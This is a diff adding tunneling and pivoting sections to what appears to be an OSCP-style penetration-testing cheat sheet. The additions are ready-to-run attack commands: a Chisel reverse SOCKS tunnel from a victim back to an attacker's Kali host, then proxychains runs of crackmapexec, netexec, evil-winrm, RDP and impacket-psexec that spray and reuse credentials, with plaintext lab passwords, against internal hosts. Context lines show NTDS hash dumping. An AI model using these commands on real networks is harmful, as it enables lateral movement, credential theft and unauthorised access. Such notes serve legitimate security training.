@@ -823,6 +823,38 @@ reg save hklm\system C:\temp\system.hive
 impacket-secretsdump -ntds ntds.dit -system system.hive local 
 ```
 
+## Tunneling & Pivoting - Chisel
+```bash
+# Setup
+# Nano /etc/proxychains4.conf
+# socks4         127.0.0.1 9050
+# socks5         127.0.0.1 1080
+
+# On kali
+chisel server -p 9001 --reverse
+
+# On victim
+upload chisel.exe
+./chisel.exe client 192.168.45.181:9001 R:socks
+```
+
+## Tunneling & Pivoting - Proxychains
+```bash
+sudo proxychains crackmapexec smb ip.txt -u username.txt -p 'Mushroom!' --continue-on-success
+sudo proxychains crackmapexec winrm ip.txt -u username.txt -H hash   --continue-on-success
+sudo proxychains crackmapexec smb ip.txt -u yoshi -p 'Mushroom!'   
+sudo proxychains crackmapexec winrm ip.txt -u yoshi -p 'Mushroom!'
+sudo proxychains evil-winrm -i 172.16.162.12 -u yoshi -p 'Mushroom!'
+sudo proxychains nxc rdp ip.txt -u yoshi -p 'Mushroom!'  
+sudo proxychains nxc rdp 172.16.162.82 -u yoshi -p Mushroom!    
+sudo proxychains xfreerdp3 /v:172.16.162.12 /u:yoshi /p:Mushroom!
+
+sudo proxychains nxc rdp ip.txt -u yoshi -p 'Mushroom!' --continue-on-success
+sudo proxychains netexec rdp ip.txt -u yoshi -p 'Mushroom!' --continue-on-success
+
+sudo proxychains impacket-psexec 'celia.almeda:7k8XHk3dMtmpnC7'@10.10.195.140 
+```
+
 ## Tunneling & Pivoting - Ligolo-ng
 ```bash
 #Kali machine - Attacker machine
@@ -987,3 +1019,4 @@ https://github.com/Greenwolf/ntlm_theft
 https://github.com/AtvikSecurity/CentralizedPotatoes
 https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet
 https://github.com/saisathvik1/OSCP-Cheatsheet
+
